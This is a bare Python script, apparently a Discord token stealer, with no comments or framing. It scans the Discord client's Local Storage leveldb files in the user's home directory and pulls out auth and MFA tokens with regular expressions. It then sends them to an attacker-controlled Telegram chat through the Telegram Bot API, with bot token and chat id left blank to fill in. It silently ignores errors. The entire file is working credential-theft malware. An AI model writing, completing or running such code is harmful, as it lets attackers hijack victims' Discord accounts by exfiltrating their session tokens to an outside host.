import os
import re
import requests

path = os.path.expanduser("~/.config/discord/Local Storage/leveldb")

tokens = []

try:
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        file_path = os.path.join(path, file_name)

        with open(file_path, 'r', errors='ignore') as file:
            for line in [x.strip() for x in file.readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
except Exception:
    pass

log = "*New log*\n"

if len(tokens) != 0:
    tokens_string = '```Tokens:\n' + ('\n'.join(tokens)) + '```'
    log = log + tokens_string
else:
    log = log + '```Tokens:\nNone```'

bot_token = ''
chat_id = ''

url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
params = {'chat_id': chat_id, 'text': log, 'parse_mode': 'MarkdownV2'}

response = requests.get(url, params=params)
